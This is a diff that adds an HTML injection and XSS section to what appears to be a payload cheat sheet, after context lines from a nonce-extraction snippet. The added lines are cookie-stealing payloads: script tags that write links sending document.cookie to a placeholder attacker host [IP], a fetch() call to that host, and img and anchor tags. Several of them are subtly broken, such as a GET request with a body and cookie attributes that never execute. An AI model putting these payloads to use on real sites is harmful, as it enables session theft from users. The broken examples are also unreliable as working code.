@@ -270,3 +270,26 @@ ajaxRequest.send();
 var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
 var nonce = nonceMatch[1];
 ```
+
+### HTML Injection 
+```
+<a href=http://[IP]>[Texto]</a>
+```
+## TAG Script
+```
+<script>document.write('<a href="https://[IP]?c='+document.cookie+'"/>[Texto]');</script>
+
+<script>
+fetch('http://[IP]',{
+method:'GET',
+mode:'no-cors',
+body:document.cookie});</script>
+
+<script>document.write('<a href="http://[IP]/index.html?c='+document.cookie+'"/>[Texto]');</script>
+
+## TAG IMG
+<img src="https://[IP]" href=1 cookie="+document.cookie+"></img>
+
+## TAG a href
+<a href="https://[IP]" href=1 cookie="+document.cookie+"></a>
+```
